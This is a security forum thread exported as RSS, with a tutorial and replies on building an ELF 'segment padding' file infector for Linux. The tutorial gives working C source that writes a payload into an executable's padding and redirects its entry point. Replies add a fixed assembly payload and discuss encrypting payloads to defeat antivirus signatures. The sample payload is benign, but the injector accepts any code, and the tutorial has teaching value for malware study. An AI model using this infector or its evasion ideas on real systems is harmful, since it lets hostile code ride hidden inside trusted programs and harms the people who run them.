<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>ELFun File Injector</title>
    <link>https://0x00sec.org/t/elfun-file-injector/410</link>
    <description>As it doesn&#39;t look that @dtm is going to cover linux stuff, I have wrote a quick and dirty version of the great [PE File Infector](https://0x00sec.org/t/pe-file-infection/401) paper from @dtm but targeting [ELF](https://en.wikipedia.org/wiki/Executable_and_Linkable_Format) binaries specifically under GNU/Linux systems.


The process I will describe is slightly different from the one explained in the PE counterpart, so you will get a different view of the process and hopefully that will help you to better understand how do these things work. Moreover, it does not feel right to just write the same thing even if it is targeting to a different system.

So, let&#39;s start.

# Infection Technique
If you had read the &quot;PE File Infector&quot; paper in this site, you should already know what a code cave is. If you do not know that, go and read it, right now.

In the Linux world, you will find references to this technique as __Segment padding infection__. It is basically the same thing, I&#39;m saing  just in case you want to look for further information.

The infection technique we are going to implement is as follow:

* Find the padding area between the `.text` segment and the next segment in the program (that is usually `.data`). 
* Append the payload code to the end of the `.text` segment (in that padding area)
* Patch the ELF binary to run the injected coded at start up (modify the ELF entry point)
* Patch the payload to return execution to the original ELF entry point 


The technique takes advantage of the padding areas in the segments. This, basically happen because the operating system works with a Page granularity. It is related to the processor memory management unit, but that is a bit out of scope. So, in general, there is an unused area at the end of the `.text` segment. The size of that area depends on the size of the code, and may even not exist or just be a couple of bytes. For that reason, this technique may not work with some programs.

The main advantage of this technique is that the file size and the overall ELF data structures are not modified at all (with the exception of the application entry point).

# Writing an Infector
The ELF code injector is pretty straightforward. The main function is a bit long, so I will divide it in smaller functional blocks in the hope that it will be easier to follow.

You can find the whole source code at github.

https://github.com/0x00pf/0x00sec_code/tree/master/elfun

## Opening the target ELF File
The first thing the main function does (after a quick check of the number of parameters) is to open the target ELF File. The code looks like this:

```
int
main (int argc, char *argv[])
{
  void        *d, *d1;
  int         target_fd, payload_fd;
  int         fsize, fsize1;

  printf (&quot;Segment Padding Infector for 0x00sec\nby pico\n\n&quot;);
  if (argc != 3)
    {
      fprintf (stderr, &quot;Usage:\n  %s elf_file payload\n&quot;, argv[0]);
      exit (1);
    }

  /* Open and map target ELF and payload */
  target_fd  = elfi_open_and_map (argv[1], &amp;d, &amp;fsize);
  payload_fd = elfi_open_and_map (argv[2], &amp;d1, &amp;fsize1);
```

OK, there is not much to say about this, the main function opens and maps the target ELF to inject our code into and the code to be injected... let&#39;s continue looking into the `elfi_open_and_map` function:

```
int
elfi_open_and_map (char *fname, void **data, int *len)
{
  int   size;
  int   fd;
  
  if ((fd = open (fname, O_APPEND | O_RDWR, 0)) &lt; 0)
    {
      perror (&quot;open:&quot;);
      exit (1);
    }
  
  size = get_file_size (fd);
  if ((*data = mmap (0, size, PROT_READ| PROT_WRITE| PROT_EXEC,
		    MAP_SHARED, fd, 0)) == MAP_FAILED)
    {
      perror (&quot;mmap:&quot;);
      exit (1);
    }
  
  printf (&quot;+ File mapped (%d bytes ) at %p\n&quot;, size, data);
  *len = size;
  return fd;
}
```

This function does three things:

1. It open the file using `open`
2. Then it uses a utility function called `get_file_size` to find out the size of the file. We need this information for the last step. The `get_file_size` function just calls `fstab` (I will not include it here as it is not really interesting)
3. It memory maps the file. This means that we can access the file as if it were in memory (using pointers), but we are actually modifying the file in disk. So, this is a very convenient way of patching a file

The function returns the file descriptor and uses to output parameters to return the pointer to the memory mapped area (that is the beginning of our file) and its size.

## Getting information
Now that we have access to our files, we will store some information:

```
  /* Get Application Entry point */
  elf_hdr = (Elf64_Ehdr *) d;
  ep = elf_hdr-&gt;e_entry;
  printf (&quot;+ Target Entry point: %p\n&quot;, (void*) ep);
```

As we said, the pointer returned by `elfi_open_and_map` points to the actual content of the file. For an ELF file, the first thing we find is the ELF header. Take a look to the [specs](http://refspecs.linuxbase.org/elf/elf.pdf) to find out the information kept by this structure.

Right now, we are interested in the application entry point. That is the address where program will start its execution. Think about it as the memory address for the `main` function... It is not that easy, but for our current discussion such a definition should be OK.

## Finding a gap
Now we have to find a gap in the target file. We had wrote a function to do that, which we call from the `main` function:

```
 Elf64_Phdr  *t_text_seg = elfi_find_gap (d, fsize, &amp;p, &amp;len);
 Elf64_Addr  *base = t_text_seg-&gt;p_vaddr;
```

The `elfi_find_gap` function will go through all the ELF segments and try to find the gap in the one that holds the code. It returns a pointer to the ELF segment structure that we will use later. It also returns the offset in the file to the gap and its size, using a couple of output parameters

After finding the code segment, we will also store the memory address where that code will be loaded. This is usually 0x400000, but it may be different on some applications.

The `elfi_find_gap` function looks like this:

```
Elf64_Phdr*
elfi_find_gap (void *d, int fsize, int *p, int *len)
{
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) d;
  Elf64_Phdr* elf_seg, *text_seg;
  int         n_seg = elf_hdr-&gt;e_phnum;
  int         i;
  int         text_end, gap=fsize;

  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr-&gt;e_phoff);

  for (i = 0; i &lt; n_seg; i++)
    {
      if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; elf_seg-&gt;p_flags &amp; 0x011)
	{
	  printf (&quot;+ Found .text segment (#%d)\n&quot;, i);
	  text_seg = elf_seg;
	  text_end = elf_seg-&gt;p_offset + elf_seg-&gt;p_filesz;
	}
      else
	{
	  if (elf_seg-&gt;p_type == PT_LOAD &amp;&amp; 
	      (elf_seg-&gt;p_offset - text_end) &lt; gap) 
	    {
	      printf (&quot;   * Found LOAD segment (#%d) close to .text (offset: 0x%x)\n&quot;,
		      i, (unsigned int)elf_seg-&gt;p_offset);
	      gap = elf_seg-&gt;p_offset - text_end;
	    }
	}
      elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_seg 
			    + (unsigned int) elf_hdr-&gt;e_phentsize);
    }

  *p = text_end;
  *len = gap;

  printf (&quot;+ .text segment gap at offset 0x%x(0x%x bytes available)\n&quot;, text_end, gap);

  return text_seg;
}
```
Once again, we first access the ELF header to figure out where, within the file, the segment information is stored. It actually  is at the offset specified by the header&#39;s field `e_phoff`. With all this information, we can start checking the segments.

First we look for a segment of type `PT_LOAD` with execution permissions. Normally there is only one, and it is the one containing the `.text` section, and therefore the application code. When we find it, we store the pointer to the segment structure (to return it later) and the offset to the actual end of the section in the file.

Then we keep looking for `PT_LOAD` segments and we calculate the gap with respect to the current executable segment we have already found, and we store the one with the smallest gap.

This function probably can be heavily improved. Normally there are only two PT_LOAD segment and they one after the other in the file. I was not sure if it is possible to get those segments out of order in the file (in theory should be possible) so that is why the function is a bit complex.

Oh sure, `PT_LOAD` segments are those that are directly loaded from the file. Other segments like the ones containing the stack or the .bss section are not stored in the file, but the code and static data have to be there and the `PT_LOAD` type is the way the system knows that the data in the file has to be loaded in memory.



## The Payload
We have to stop for a sec, looking to our infector code and take a look to the payload we are going to use and how to get it into memory. We had just write a simple payload that prints a message in the console. I know that is not very impressive, but this is already becoming a bit long and complex howto.

So, our payload looks like this:

```
section .text
        global _start

_start:
        mov rax,1       ; [1] - sys_write
        mov rdi,1       ; 0 = stdin / 1 = stdout / 2 = stderr
        lea rsi,[rel msg]     ; pointer(mem address) to msg (*char[])
        mov rdx, msg_end - msg      ; msg size
        syscall         ; calls the function stored in rax

	mov rax, 0x11111111
	jmp rax

align 8
        msg     db &#39;This file has been infected for 0x00SEC&#39;,0x0a,0
	msg_end db 0x0
```
It is the classical `Hello World` assembler program, but, just after printing the message, it will jump back to somewhere. The 0x11111111 is a mark where we will have to write the original ELF access point, to let the original application run normally.

As usual, we can compile this small program with:

```
nasm -f elf64 -o payload.o payload.asm;ld -o payload payload.o
```

And we are done to get back to our ELF injector.

# Processing the payload
You could just use some external tool to produce an hex dump of the payload code. Check @unh0lys0da [shellcode tutorial](https://0x00sec.org/t/linux-shellcoding-part-1-0/289) for details. In this case, as we are playing with the ELF format, we are going to directly use the binary produced by nasm.

The way we used to compile our payload, was actually producing a ELF file. If you recall the beginning of the paper we had already opened the payload and mapped it on memory. Now we just need to find out where the actual code is, and copy it in the `.text` segment gap of the target program we have found before.

This is what the code below does:

```
  Elf63_Shdr *p_text_sec = elfi_find_section (d1, &quot;.text&quot;);

  printf (&quot;+ Payload .text section found at %lx (%lx bytes)\n&quot;, 
	  p_text_sec-&gt;sh_offset, p_text_sec-&gt;sh_size);

  if (p_text_sec-&gt;sh_size &gt; len)
    {
      fprintf (stderr, &quot;- Payload to big, cannot infect file.\n&quot;);
      exit (1);
    }
  /* Copy payload in the segment padding area */
  memmove (d + p, d1 + p_text_sec-&gt;sh_offset, p_text_sec-&gt;sh_size);

```

First we call a function (that we will describe in a sec) to find out where the `.text` section is, and therefore where the payload code is. The function returns a pointer to an ELF section structure that contains all the information we need.

Then we have to check if the size of the `.text` section of the payload (our code) fits in the gap we had previously found, and finally we just copy the payload code into the target file just at the end of the executable segment. Using the pointer returned by `elfi_find_gap`.


## Finding a Section in an ELF File
So, we have to take a look to the `elfi_find_section` function. Here it is

```int
Elf64_Shdr *
elfi_find_section (void *data, char *name)
{
  char        *sname;
  int         i;
  Elf64_Ehdr* elf_hdr = (Elf64_Ehdr *) data;
  Elf64_Shdr *shdr = (Elf64_Shdr *)(data + elf_hdr-&gt;e_shoff);
  Elf64_Shdr *sh_strtab = &amp;shdr[elf_hdr-&gt;e_shstrndx];
  const char *const sh_strtab_p = data + sh_strtab-&gt;sh_offset;
   
  printf (&quot;+ %d section in file. Looking for section &#39;%s&#39;\n&quot;, 
	  elf_hdr-&gt;e_shnum, name);
  
  
  for (i = 0; i &lt; elf_hdr-&gt;e_shnum; i++)
    {
      sname = (char*) (sh_strtab_p + shdr[i].sh_name);
      if (!strcmp (sname, name))  return &amp;shdr[i];
    }
  
  return NULL;
}

```

In order to find a section by name, we have to access to the symbol table in the ELF file. That table stores all the symbols required by the executable. Section names, external libraries, relocation symbols names,... Everything that is a human readable string.

The section list in the ELF file stores the section name as an index in the symbol table. So, despite of all that pointer gymnastics, the function is just looping through the section list, retrieving the name using the information there, and comparing that string with the passed parameter.

Just open the ELF spec, and start following the data structures. It&#39;s just tedious but not difficult.

# Patching Entry Points
So, we are almost done. Now we just need to patch the entry points. This is done with the following code in the `main` function:

```
  /* Patch return address */
  elfi_mem_subst (d+p, p_text_sec-&gt;sh_size, 0x11111111, (long)ep);

  /* Patch entry point */
  elf_hdr-&gt;e_entry = (Elf64_Addr) (base + p);

  /* Close files and actually update target file */
  close (payload_fd);
  close (target_fd);

```
The `elfi_mem_subst` function just looks for the sequence `0x11111111` (do you remember it in our payload?), and substitutes it with the original ELF entry point. This will start the target application just after running our payload.

Then, for the main entry point, we just use our ELF Header pointer and write there the address for our payload, so it gets executed when the application is executed. We calculate the payload address as the base address we have got from the execution segment plus the offset to the segment gap we found at the beginning.

Once we are done, we just close the files to make sure that all the changes we made in the memory mapped area, make it to the file.

Just for completeness, let&#39;s take a look to `elfi_mem_subtr`:

```
int
elfi_mem_subst (void *m, int len, long pat, long val)
{
  unsigned char *p = (unsigned char*)m;
  long v;
  int i, r;

  for (i = 0; i &lt; len; i++)
    {
      v = *((long*)(p+i));
      r = v ^pat;

      if (r ==0) 
	{
	  printf (&quot;+ Pattern %lx found at offset %d -&gt; %lx\n&quot;, pat, i, val);
	  *((long*)(p+i)) = val;
	  return 0;
	}
    }
  return -1;
}

```

Nothing special, we just scan the payload byte by byte to find our mark. When found, it is substituted by the value passed as a parameter (in this case the original entry point).

# Using the injector
So, compile the application and generate your payload

```
$ make elf_injector
$ nasm -f elf64 -o payload.o payload.asm;ld -o payload payload.o
```

An then just start injecting your payload:
```
$ ./elf_inject xeyes payload
```

I had tried the program with some binaries in my system. I have to say that it had failed with some, and I do not know yet the reason. Some of the ones I successfully used were: xeyes, vim, lynx...

It failed with evince, for instance... So, lucky you, it is not perfect, and you have something to look at and play with :)... Have ELFun!

# Final Words
If you are planning to look further into this topic (you should, it is really interesting), it would be a good idea to install the `readelf` for easily inspect your ELF files.

Also make sure that `xxd` is available to do hex dump and check that you are dumping data in the right place.

I have wrote this pretty quickly so it may not be the most comprehensive howto and some parts may be hard to follow. Let me know in the comments if something needs improvement

Happy Hacking!
pico</description>
    
    <lastBuildDate>Mon, 25 Sep 2017 06:29:32 +0000</lastBuildDate>
    <category>Malware</category>
    <atom:link href="https://0x00sec.org/t/elfun-file-injector/410.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/31">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/31</link>
        <pubDate>Sun, 21 Jan 2018 00:42:09 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-31</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[febri]]></dc:creator>
        <description><![CDATA[
            <p>very interesting article, thank you ! <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/30">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/30</link>
        <pubDate>Mon, 25 Sep 2017 06:29:32 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-30</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[slevin]]></dc:creator>
        <description><![CDATA[
            <p>Sorry for necroposting, but as the current code didn’t work for me I thought I would add how I fixed it, in case anybody else comes here after me.</p>
<p>The payload, although running and passing flow over to <code>_main</code>, made the kernel segfault. The reason being that the CPU state had been corrupted by the <code>syscall</code> code. Saving the registers before and then restoring them after fixed it.</p>
<p>Also, I had to change the pattern being replaced by the original entry point, to be 8 bytes. When replacing the <code>0x11111111</code> pattern with <code>ep</code>, the value is zero extended when casting to <code>long</code>:</p>
<pre><code>elfi_mem_subst (d+p, p_text_sec-&gt;sh_size, 0x11111111, (long)ep);
</code></pre>
<p>My final payload:</p>
<pre><code class="lang-auto">section .text
  global _start

_start:
  ;; save cpu state
  push rax
  push rdi
  push rsi
  push rdx

  ;; write msg to stdout
  mov rax,1                     ; [1] - sys_write
  mov rdi,1                     ; 0 = stdin / 1 = stdout / 2 = stderr
  lea rsi,[rel msg]             ; pointer(mem address) to msg (*char[])
  mov rdx, msg_end - msg        ; msg size
  syscall                       ; calls the function stored in rax

  ;; restore cpu state
  pop rdx
  pop rsi
  pop rdi
  pop rax

  ;; jump to _main
  mov rax, 0x1111111111111111   ; address changed during injection
  jmp rax

align 8
  msg     db 0x1b,'[31msuch infected, much wow!',0x1b,'[0m',0x0a,0
  msg_end db 0x0
</code></pre>
<p>Sorry about the notification guys.</p>
<p>Really awesome tut, pico. Have my first contribution to 0x00sec <img src="https://0x00sec.org/images/emoji/twitter/heart.png?v=9" title=":heart:" class="emoji" alt=":heart:"></p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/29">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/29</link>
        <pubDate>Tue, 12 Sep 2017 04:58:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-29</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Good catch <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> . I would like to say that it was in purpose to see if people was following the paper… but it was just a mistake <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"></p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/28">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/28</link>
        <pubDate>Tue, 11 Oct 2016 16:35:00 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-28</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="0x00pf" data-post="1" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>In order to find a section by name, we have to access to the symbol table in the ELF file. That table stores all the symbols required by the executable. Section names, external libraries, relocation symbols names,… Everything that is a human readable string.</p>
</blockquote>
</aside>
<p>I might be a little late on that but I was reading through it again and I noticed that sentence. I think you mean string table instead of symbol table(?) Thus the “&amp;shdr[elf_hdr-&gt;e_shstrndx];”  and “shdr[i].sh_name” parts of your code which point to the string table section and the index into the section header string table section respectively.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/27">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/27</link>
        <pubDate>Tue, 11 Oct 2016 07:30:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-27</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[_py]]></dc:creator>
        <description><![CDATA[
            <p>Wow, after an insane amount of research and coming back to this post I can finally make sense out of it. Brilliant post <a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a>!</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/26">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/26</link>
        <pubDate>Mon, 29 Aug 2016 01:19:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-26</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[oaktree]]></dc:creator>
        <description><![CDATA[
            <p>Brilliant. Great job. Have I reached 20 characters yet?</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/25">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/25</link>
        <pubDate>Tue, 28 Jun 2016 18:36:28 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-25</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p><a class="mention" href="https://0x00sec.org/u/pry0cc">@pry0cc</a> is right the main problem is the stub… encoding the payload is easy, but the stub cannot be encoded and you need to make it… <em>change</em>  to avoid detection. Sounds like a nice topic for a post <img src="https://0x00sec.org/images/emoji/twitter/stuck_out_tongue.png?v=9" title=":stuck_out_tongue:" class="emoji" alt=":stuck_out_tongue:"></p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/24">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/24</link>
        <pubDate>Tue, 28 Jun 2016 15:55:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-24</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>You would be referring to a Crypter, pico has actually done a tutorial on Linux Crypters <a href="https://0x00sec.org/t/a-simple-linux-crypter/537">here</a></p>
<p>You just need to watch out that they don’t fingerprint the stub, once they’ve done that encrypting the payload is useless.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/23">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/23</link>
        <pubDate>Tue, 28 Jun 2016 06:29:41 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-23</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00_Jinx]]></dc:creator>
        <description><![CDATA[
            <p>Nice. It would be awesome if we could make the module grow, and also have a way to obfuscate payloads so they are harder to find. If you have any experience in these subjects, let me know! I’m going to be researching ways to encrypt the payload then unencrypt when the program is ran, making the AV signature useless. Also, I added some error checking to the module, like a function to make sure it is a .elf file.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/22">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/22</link>
        <pubDate>Tue, 28 Jun 2016 05:38:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-22</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>Looks  nice <a class="mention" href="https://0x00sec.org/u/0x00_jinx">@0x00_Jinx</a>. There a couple more techniques to inject payloads that may be added and make the module grow.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/21">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/21</link>
        <pubDate>Tue, 28 Jun 2016 05:02:35 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-21</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00_Jinx]]></dc:creator>
        <description><![CDATA[
            <p>I got bored so I used your code to create a Python module out of this. The code is on <a href="http://pastebin.com/PsQMFE1s" rel="nofollow noopener">Pastebin</a> The instructions are included in the source code in the comment at the top along with an example.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/20">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/20</link>
        <pubDate>Tue, 28 Jun 2016 03:07:55 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-20</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>At first glance it looks good!</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/19">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/19</link>
        <pubDate>Wed, 15 Jun 2016 06:51:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-19</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Make another post and link this post!</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/18">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/18</link>
        <pubDate>Tue, 14 Jun 2016 21:43:03 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-18</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>So far I have this:<br>
<a href="http://pastebin.com/DywNNiw2" class="onebox" target="_blank" rel="nofollow noopener">http://pastebin.com/DywNNiw2</a></p>
<p>Though there are some issues ^_^’<br>
Think I there are some pointer issues.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/17">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/17</link>
        <pubDate>Tue, 14 Jun 2016 21:35:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-17</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="0x00pf" data-post="15" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
<img alt="" width="20" height="20" src="https://0x00sec.org/user_avatar/0x00sec.org/0x00pf/40/199_2.png" class="avatar"> 0x00pf:</div>
<blockquote>
<p>Well, that code is not the best in the world. This injector always adds the code at the end of the .text segment, so the gap we are looking for in that function is the one from the end of the .text section to the beginning, of whatever other sections comes after. As I didn’t know if the .data segment is always the next section, I just calculate the gap for every single section in the file, and I keep the smaller as that is the one between .text segment and .XXX next segment in memory.</p>
<p>Sorry for the poor wording of this explanation… Let me know if I manage to explain it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
</blockquote>
</aside>
<p>Yes I get it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>About the modification, I’ll try it right now, see if it makes a difference ^^</p>
<p>I’ll also try to implement the 32 and 64 bit stuff.</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/16">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/16</link>
        <pubDate>Sat, 11 Jun 2016 00:05:17 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-16</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <aside class="quote no-group" data-username="unh0lys0da" data-post="13" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
 unh0lys0da:</div>
<blockquote>
<p>Would it be possible to infect 64 bit files, if I’d compile this injector as a 32 bit ELF binary?</p>
</blockquote>
</aside>
<p>Sure. We are just changing bytes in a file.</p>
<aside class="quote no-group" data-username="unh0lys0da" data-post="13" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
 unh0lys0da:</div>
<blockquote>
<p>Here (unsigned int) is a 32 bit value, could it be possible that e_phoff exceeds 0xffffffff ?</p>
</blockquote>
</aside>
<p>If you check the structure in the <code>elf.h</code> it is actuall 16bits.</p>
<aside class="quote no-group" data-username="unh0lys0da" data-post="13" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
 unh0lys0da:</div>
<blockquote>
<p>&amp; 0x11, would only hold true for PF_X. Or is .text always the first executable segment it will find?</p>
</blockquote>
</aside>
<p>I think you are right with this. have you tried the modification?. I will take a look later but looks like you are right.</p>
<aside class="quote no-group" data-username="unh0lys0da" data-post="13" data-topic="410">
<div class="title">
<div class="quote-controls"></div>
 unh0lys0da:</div>
<blockquote>
<p>Why are we looking for the smallest gap, instead of the biggest?</p>
</blockquote>
</aside>
<p>Well, that code is not the best in the world. This injector always adds the code at the end of the <code>.text</code> segment, so the gap we are looking for in that function is the one from the end of the <code>.text</code> section to the beginning, of whatever other sections comes after. As I didn’t know if the <code>.data</code> segment is always the next section, I just calculate the gap for every single section in the file, and I keep the smaller as that is the one between <code>.text</code> segment and <code>.XXX</code> next segment in memory.</p>
<p>Sorry for the poor wording of this explanation… Let me know if I manage to explain it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/15">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/15</link>
        <pubDate>Fri, 10 Jun 2016 05:39:34 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-15</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[0x00pf]]></dc:creator>
        <description><![CDATA[
            <p>That is indeed possible. I just chose 64bits in the post to keep it simple, but indeed, a proper program should work with both architectures… I’m looking forward to your version of the injector!!!</p>
          <p><a href="https://0x00sec.org/t/elfun-file-injector/410/14">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/elfun-file-injector/410/14</link>
        <pubDate>Fri, 10 Jun 2016 05:28:25 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-410-14</guid>
        <source url="https://0x00sec.org/t/elfun-file-injector/410.rss">ELFun File Injector</source>
      </item>
      <item>
        <title>ELFun File Injector</title>
        <dc:creator><![CDATA[IoTh1nkN0t]]></dc:creator>
        <description><![CDATA[
            <p>Because it would determin on runtime, it’s not about the injector, it’s about the target file.<br>
<a class="mention" href="https://0x00sec.org/u/0x00pf">@0x00pf</a> Would it be possible to infect 64 bit files, if I’d compile this injector as a 32 bit ELF binary?<br>
I maybe found some bugs:</p>
<pre><code class="lang-auto">  elf_seg = (Elf64_Phdr *) ((unsigned char*) elf_hdr 
			    + (unsigned int) elf_hdr-&gt;e_phoff);
</code></pre>
<p>Here <code>(unsigned int)</code> is a 32 bit value, could it be possible that e_phoff exceeds 0xffffffff ?</p>
<p>also, shouldnt:</p>
